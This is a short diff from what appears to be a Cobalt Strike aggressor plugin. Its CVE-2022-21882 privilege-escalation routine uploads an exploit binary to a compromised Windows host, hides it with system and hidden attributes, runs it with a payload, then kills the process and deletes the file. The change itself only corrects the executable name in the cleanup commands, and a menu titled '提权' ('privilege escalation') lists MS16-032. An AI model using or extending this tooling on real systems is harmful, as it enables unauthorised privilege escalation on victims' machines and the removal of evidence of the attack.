@@ -262,8 +262,8 @@ sub CVE_2022_21882{
     bupload($bid, script_resource("bin/Privilege_escalation/CVE_2022_21882/CVE_2022_21882.exe"));
     bshell($bid, "attrib \"CVE_2022_21882.exe\" +s +h");
     bshell($bid,"CVE_2022_21882.exe \"".$payload."\"");
-    bshell($bid,"taskkill /f /im CVE_2022_21882");
-    bshell($bid,"del /F /S /Q /AH CVE_2022_21882");
+    bshell($bid,"taskkill /f /im CVE_2022_21882.exe");
+    bshell($bid,"del /F /S /Q /AH CVE_2022_21882.exe");
 }
 menu "提权"{
     item "MS16-032"{
